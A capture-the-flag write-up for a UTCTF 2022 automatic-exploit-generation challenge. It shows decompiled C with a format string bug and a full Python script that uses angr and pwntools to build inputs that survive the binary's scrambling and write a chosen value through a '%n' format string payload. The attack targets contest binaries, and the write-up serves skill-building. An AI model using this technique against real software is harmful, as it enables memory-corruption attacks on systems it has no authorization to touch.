```
Now with printf!

By Tristan (@trab on discord)
nc pwn.utctf.live 5002
```

[binary 1](/utctf-2022/bins/aeg1)

![](/uctf-2022/angr_simp.png)

I really like automatic exploit generation. I did the one in last year's UTCTF and in general they are some of my favorite challenges. So of course as soon as I heard there was one here I went straight for it. 

```text
❯  nc pwn.utctf.live 5002
You will be given 10 randomly generated binaries.
You have 60 seconds to solve each one.
Solve the binary by making it exit with the given exit code
Press enter when you're ready for the first binary.
...xxd blob

Binary should exit with code 230
```

The first step is to scope out the provided binary. What's the general sort of attack we're doing, how do different binaries differ, etc. 

```c
void main(void)

{
  long lVar1;
  undefined8 *puVar2;
  long in_FS_OFFSET;
  undefined8 local_218;
  undefined8 local_210;
  undefined8 local_208 [63];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_218 = 0;
  local_210 = 0;
  puVar2 = local_208;
  for (lVar1 = 0x3e; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  fgets((char *)&local_218,0x202,stdin);
  permute(&local_218);
  printf((char *)&local_218);
                    /* WARNING: Subroutine does not return */
  exit(exit_code);
}
```

It's a pretty clear format string vulnerability and it exits using a global variable "exit_code" as an argument. 

![checksec of an aeg binary; no PIE](/utctf-2022/aeg_checksec.png)

There isn't even PIE, so with stack control and a format string vulnerability it should be pretty straightforward to use %n to write whatever we want to exit_code. 

Unfortunately...

```
void permute(undefined8 param_1)

{
  permute5(param_1);
  permute3(param_1);
  permute6(param_1);
  permute1(param_1);
  permute4(param_1);
  permute7(param_1);
  permute2(param_1);
  permute8(param_1);
  return;
}
```

Any input we provide gets shuffled up so what gets passed to printf is completely different than what gets provided via stdin. A quick check of a new binary shows that this all gets shuffled about when a new binary is generated. How do we resolve this?  


Well I hate work so I just used angr to magic up a solution lol. All you need to do to solve this is make a format string payload, explore to find a state at the printf invocation, apply some constraints on memory, and then boom you can just ask for the stdin that fits those constraints. It's really quite disgusting that it's this easy. 

```python
import angr, argparse
from pwn import *
from claripy import *
import os
from subprocess import check_output
from pwn import *

r = remote("pwn.utctf.live", 5002)

r.sendline()
r.recvuntil("binary.\n")
for i in range(10):
    log.info(f"trying round {i}")
    with open("tmp.xxd", "wb") as f:
        f.write(r.recvuntil("\n\n"))
    os.system("xxd -rp tmp.xxd > binary.tmp")

    r.recvuntil(b"Binary should exit with code ")
    exit_code = int(r.recvline().rstrip())
    log.info(f"attempting to call exit({exit_code})")
    exe = ELF("./binary.tmp")
    p = angr.Project("./binary.tmp")

    state = p.factory.blank_state()
    simgr = p.factory.simgr(state, save_unconstrained=True)


    # lmao this is genuinely disgusting
    printf_caller_addr = int(check_output("objdump -Mintel -D ./binary.tmp | rg \"call.*?printf@plt\"",shell=True).decode().lstrip().split(":")[0], 16)


    payload = f"%{exit_code}c%10$n\x00"
    simgr.explore(find=printf_caller_addr)
    for i in simgr.found:
        i.add_constraints(i.memory.load(i.regs.rdi,len(payload)) == payload)
        i.add_constraints(i.memory.load(i.regs.rdi+16,8) == p64(exe.symbols['exit_code']))
        if i.satisfiable():
            log.info("sat!")
        else:
            log.error("oop not sat :(")
            exit(0)

        r.send(i.posix.dumps(0))
        r.recvuntil(f"{exit_code}\n")
r.interactive()
```

I went to run it on the server... only to find that it took too long. Averaged something like 80 seconds on my laptop and the server times out at 60 seconds per binary. I was a little scared that I wouldn't be able to get it fast enough to solve but a little investigation found the tip "Use pypy.  pypy is an alternate python interpreter that performs optimized jitting of python code." I tried running it with pypy and sure enough it cut my average execution time to 40 seconds, comfortably fast enough to solve it. 

utflag{you_mix_me_right_round_baby_right_round135799835}